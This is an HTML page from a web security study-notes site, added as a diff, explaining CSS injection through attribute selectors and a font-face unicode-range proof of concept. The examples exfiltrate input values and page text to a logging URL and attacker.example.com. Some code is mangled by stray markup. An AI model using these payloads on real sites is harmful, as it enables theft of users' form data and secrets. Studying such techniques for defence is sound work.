@@ -1,0 +1,161 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en-US" data-content_root="../../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CSS Injection &mdash; Web Security Study Notes 1.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../../_static/pygments.css?v=fa44fd50" />
+      <link rel="stylesheet" type="text/css" href="../../../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../../_static/documentation_options.js?v=4042127e"></script>
+      <script src="../../../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../../../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../../index.html" class="icon icon-home">
+            Web Security Study Notes
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Content index:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../basic/index.html">1. Introduction</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../network/index.html">2. Computer network and protocol</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../info/index.html">3. Information collection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../language/index.html">4. Language and framework</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../intranet/index.html">5. Intranet penetration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../cloud/index.html">6. Cloud Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../defense/index.html">7. Defense Technology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../auth/index.html">8. Authentication mechanism</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../tools/index.html">9. Tools and resources</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../manual/index.html">10. Quick manual check</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../misc/index.html">11. other</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">Web Security Study Notes</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">CSS Injection</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../../_sources/vuln/xss/trick/cssi.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="css-injection">
+<h1>CSS Injection<a class="headerlink" href="#css-injection" title="Link to this heading"></a></h1>
+<section id="basic-introduction">
+<h2>Basic introduction<a class="headerlink" href="#basic-introduction" title="Link to this heading"></a></h2>
+<p>CSS injection first started by using functions or features such as <code class="docutils literal notranslate"><span class="pre">expression()`````````````````</span></code> in CSS to introduce external malicious code, but with the development of browsers, this These methods have been gradually disabled, and at the same time, some new attack methods have emerged.</p>
+</section>
+<section id="css-selectors">
+<h2>CSS selectors<a class="headerlink" href="#css-selectors" title="Link to this heading"></a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">style</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>#form2 input[value^=’a’] { background-image: url(<a class="reference external" href="http://localhost/log.php/a">http://localhost/log.php/a</a>); }
+#form2 input[value^=’b’] { background-image: url(<a class="reference external" href="http://localhost/log.php/b">http://localhost/log.php/b</a>); }
+#form2 input[value^=’c’] { background-image: url(<a class="reference external" href="http://localhost/log.php/c">http://localhost/log.php/c</a>); }
+[…]
+&lt;/style&gt;
+&lt;form action=”<a class="reference external" href="http://example.com">http://example.com</a>” id=”form2”&gt;
+&lt;input type=”text” id=”secret” name=”secret” value=”abc”&gt;
+&lt;/form&gt;</p>
+<p>The above image is an example of using CSS selectors to complete an attack</p>
+</section>
+<section id="abusing-unicode-range">
+<h2>Abusing Unicode Range<a class="headerlink" href="#abusing-unicode-range" title="Link to this heading"></a></h2>
+<p>When CSS can be inserted, you can use <code class="docutils literal notranslate"><span class="pre">font-face</span></code> to get the corresponding character set of the destination web page with <code class="docutils literal notranslate"><span class="pre">unicode-range</span></code>. PoC is as follows</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">style</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>&#64;font-face{
+font-family:poc;
+src: url(http://attacker.example.com/?A); /* fetched <em>/
+unicode-range:U+0041;
+}
+&#64;font-face{
+font-family:poc;
+src: url(http://attacker.example.com/?B); /</em> fetched too <em>/
+unicode-range:U+0042;
+}
+&#64;font-face{
+font-family:poc;
+src: url(http://attacker.example.com/?C); /</em> not fetched <a href="#id1"><span class="problematic" id="id2">*</span></a>/
+unicode-range:U+0043;
+}
+#sensitive-information{
+font-family:poc;
+}
+&lt;/style&gt;
+&lt;p id=”sensitive-information”&gt;AB&lt;/p&gt;</p>
+<p>When there are many characters, you can narrow the scope with CSS attributes such as <code class="docutils literal notranslate"><span class="pre">::first-line</span></code> to obtain more precise content</p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025-2025, Lyle.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
